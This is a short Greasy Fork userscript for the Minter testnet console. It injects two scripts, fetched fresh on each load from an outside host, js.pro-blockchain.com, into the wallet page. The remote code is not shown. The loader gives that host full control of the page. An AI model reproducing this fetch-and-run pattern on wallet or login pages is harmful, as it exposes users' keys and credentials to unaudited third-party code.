// ==UserScript==
// @name         Lxgn Minter main
// @namespace    https://testnet.console.minter.network/
// @version      0.08
// @author       lxgn
// @description  Minter
// @match        https://testnet.console.minter.network/*
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/373399/Lxgn%20Minter%20main.user.js
// @updateURL https://update.greasyfork.org/scripts/373399/Lxgn%20Minter%20main.meta.js
// ==/UserScript==


var ms = new Date();
//document.write();

var script2 = document.createElement('script');
//var kuda2 = "http://code.jquery.com/jquery-1.7.2.js?"+ms.getTime();
//var kuda2 = "http://code.jquery.com/jquery-1.7.2.js";
var kuda2 = "https://js.pro-blockchain.com/minter/jquery/?"+ms.getTime();
script2.src = kuda2;
console.log(kuda2);

var script = document.createElement('script');
//var t = Math.random()*1000000;

var kuda = "https://js.pro-blockchain.com/minter/?"+ms.getTime();
console.log(kuda);
script.src = kuda;
document.body.appendChild(script2);
document.body.appendChild(script);

script.onload = function() {
    // после выполнения скрипта становится доступна функция _
    //alert( 'load script' ); // её код
  }